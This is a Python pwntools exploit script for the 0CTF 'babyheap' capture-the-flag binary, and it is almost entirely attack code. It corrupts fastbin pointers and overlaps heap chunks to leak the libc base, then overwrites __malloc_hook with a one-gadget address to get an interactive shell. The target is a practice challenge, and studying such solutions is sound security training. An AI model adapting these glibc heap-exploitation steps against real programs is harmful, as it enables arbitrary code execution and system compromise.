#!/usr/bin/python
from pwn import *

def alloc(size):
    p.sendline("1")
    print p.recvuntil(": ")
    p.sendline(str(size))
    print p.recvuntil(": ", timeout=1)

def fill(index, size, content):
    p.sendline("2")
    print p.recvuntil(": ")
    p.sendline(str(index))
    print p.recvuntil(": ")
    p.sendline(str(size))
    print p.recvuntil(": ")
    p.send(content)
    print p.recvuntil(": ")

def free(index):
    p.sendline("3")
    print p.recvuntil(": ")
    p.sendline(str(index))
    print p.recvuntil(": ")

def dump(index):
    p.sendline("4")
    print p.recvuntil(": ")
    p.sendline(str(index))
    print p.recvuntil("Content: ")
    p.recvline()
    data = p.recvline()
    print p.recvuntil(": ")
    return data

def exit():
    print p.recvuntil(": ")
    p.sendline("5")

def leak():
    alloc(32)
    alloc(32)
    alloc(32)
    alloc(32)
    alloc(128)
    free(1)
    free(2)

    #change 1byte of FD of chunk2
    payload = p64(0)*5
    payload += p64(0x31)
    payload += p64(0)*5 
    payload += p64(0x31)
    payload += p8(0xc0)
    fill(0, len(payload), payload)

    #change size of chunk4 same as other chunks
    payload = p64(0)*5
    payload += p64(0x31)
    fill(3, len(payload), payload)

    #alloc 2 more chunks
    #2,4 chunks are allocated at same addr(2->fastbin, 4->small bin)
    alloc(32)
    alloc(32)

    #restore the size of chunk4
    payload = p64(0)*5
    payload += p64(0x91)
    fill(3, len(payload), payload)

    alloc(128)
    #free chunk4 (small bin)
    free(4)

    #dump(2)
    data = dump(2)
    addr = data[:8]
    libc_leak = u64(addr)
    libc_base = libc_leak - 0x3C3B78
    print 'libc_base', hex(libc_base)
    return libc_base

if __name__=="__main__":
    p = process("./0ctfbabyheap")
    print p.recvuntil(":")

    #malloc_hook = leak()
    libc_base = leak()

    alloc(104)
    free(4)

    #payload = p64(malloc_hook-35)
    payload = p64(libc_base + 0x3c3aed)
    fill(2, len(payload), payload)

    #
    alloc(96)
    alloc(96)

    #
    payload = "A"*19
    payload += p64(libc_base + 0x4526a)
    fill(6, len(payload), payload)
    #
    alloc(100)

    p.interactive()

    p.close()
